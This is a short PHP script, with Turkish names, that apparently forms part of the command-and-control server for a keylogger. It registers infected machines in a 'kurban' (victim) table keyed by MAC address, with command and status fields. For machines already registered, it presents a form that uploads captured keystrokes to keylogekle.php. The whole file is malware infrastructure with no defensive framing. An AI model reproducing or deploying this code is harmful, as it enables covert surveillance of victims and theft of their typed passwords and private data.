<?php

include("vt.php");
  ob_start();


	$cekilen_id=htmlspecialchars(strip_tags($_GET["id"]));
	
	$sorgu = $db->prepare("SELECT * FROM kurban WHERE macadres=:id");				//istenilen id deki veriyi çekme
		$sorgu->execute(array(':id'=>$cekilen_id));
		
		if(empty($sorgu->rowCount())){?>
			
			<form action="kurbanek.php" method="POST">
		
		<input type="text" name="bilgisayaradi" id="txt">
		<input type="text" name="isletim" id="txt2">
		<input type="hidden" name="acik" value="1">
		<input type="hidden" name="macadres" value="<?php echo $cekilen_id;?>">
		<input type="hidden" name="komut" value="0">				<input type="hidden" name="hata" value="0">				<input type="hidden" name="mesag" value="">		
		<button type="submit" id="btn">Ekle</button>
		</form>
		
		<?php
		
		
		
		
		}else{?>
			<form action="keylogekle.php" method="POST">
		
		<input type="text" name="keylog" id="txt">
		<input type="hidden" name="acik" value="1">
		<input type="hidden" name="id" value="<?php echo $cekilen_id;?>">
		<input type="hidden" name="isletim" id="txt2">		<?php					$sorgu = $db->prepare("SELECT * FROM kurban WHERE macadres=:id");				//istenilen id deki veriyi çekme		$sorgu->execute(array(':id'=>$cekilen_id));		if($sorgu->rowCount()){			$row1=$sorgu->fetch(PDO::FETCH_ASSOC);			if($row1['hata']=="3"){				echo "<input type='hidden' name='hata' value='0'>";			}				}		?>
		<button type="submit" id="btn">gönder</button>
		</form>
			
			
		<?php }?>
		
		
		
		<?php
		
		ob_end_flush();
?>





